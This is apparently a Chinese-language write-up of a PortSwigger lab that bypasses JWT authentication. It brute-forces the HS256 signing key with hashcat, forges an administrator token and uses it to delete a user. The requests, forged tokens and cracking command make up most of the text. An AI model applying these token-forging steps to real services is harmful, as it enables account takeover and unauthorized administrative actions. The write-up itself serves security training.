Lab: JWT authentication bypass via weak signing key

2024-12-27
#write-up  #portswigger  #jwt 

Lab description#

Solution#

  1. 点击右上角My account并使用wiener:peter登录
  2. 登录后跳转至个人页面，请求如下
    GET /my-account?id=wiener HTTP/2
Cookie: session=eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoid2llbmVyIn0.892fbasPXIbgCheJYfaLEcam5WlhWqdHIEts_piqbqo
  3. 根据题目提示，使用hashcat与wordlist of common secrets暴力破解jwt密钥
    $ hashcat -a 0 -m 16500 eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoid2llbmVyIn0.892fbasPXIbgCheJYfaLEcam5WlhWqdHIEts_piqbqo /tmp/jwt.secrets.list

... :secret1
  4. 根据hashcat爆破结果密钥为secret1
  5. 使用jwt.io修改JWT，首先在VERIFY SIGNATURE中的your-256-bit-secret栏位替代为secret1
  6. 修改JWT PAYLOAD中的sub为administrator
  7. 重放步骤2请求，填入修改后的JWT，并修改url为/admin
    GET /admin HTTP/2
Cookie: session=eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Ip0VbwwneBvqHD5O0ff0wE0Hpobf5NWIHy2g6wAKxJg

    HTTP/2 200 OK

<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
  8. 修改上述请求url为/admin/delete?username=carlos并且再次发送请求，即可解题
    GET /admin/delete?username=carlos HTTP/2
Cookie: session=eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Ip0VbwwneBvqHD5O0ff0wE0Hpobf5NWIHy2g6wAKxJg

    HTTP/2 302 Found
